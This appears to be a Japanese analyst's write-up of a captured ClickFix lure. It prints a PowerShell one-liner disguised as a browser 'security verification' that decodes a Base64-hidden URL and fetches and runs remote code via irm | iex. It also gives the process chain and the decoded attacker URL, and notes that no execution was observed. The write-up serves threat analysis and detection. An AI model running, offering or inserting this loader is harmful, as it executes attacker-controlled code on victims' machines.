# process・command line解析

## 原文

```powershell
<# Security verification #> <# Completes the browser challenge for this device. #> <# Ticket 9D9527B1E4AE | BC7ED72F-6EC5 #> $ErrorActionPreference='SilentlyContinue';$ProgressPreference='SilentlyContinue';try{$Host.UI.RawUI.WindowTitle='Verification'}catch{};try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{};Write-Host 'Completing verification...' -ForegroundColor DarkYellow;function Confirm-SecuritySession { <# bind one-time session ticket #> $u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly90cmlhcGZvZy5jb20vc2VjdXJpdHkvYzhwcHdveWU1MA==')); irm $u | iex };Confirm-SecuritySession
```

## process chain

```text
既存powershell.exeへ貼り付け → Confirm-SecuritySession関数 → Base64 URL復号 → 同一powershell.exe内でHTTP応答をIEX評価
```

## 処理順

1. 利用者がClickFix誘導に従い、Run dialogまたは既存PowerShellへ文字列を貼り付ける想定である。貼り付け・実行の実観測はない。
2. `Base64 URL復号 + Invoke-RestMethod + Invoke-Expression`によりstageを取得し、PowerShellのmemory内で評価する。
3. 取得stageが追加processを生成できるが、現在の応答からstageを復元できず、子process名・引数・永続化は確定できない。

## 復号後の最終command／URL

```text
https://triapfog.com/security/c8ppwoye50
```

## 解析上の境界

- captured commandのprocess列は静的に復元した候補であり、実行済みprocess treeではない。
- analyst probeはGETのみで、PowerShell、script、payloadを起動していない。
- 取得不能な後段内容を、既知ClickFix campaignの一般的挙動から補完していない。
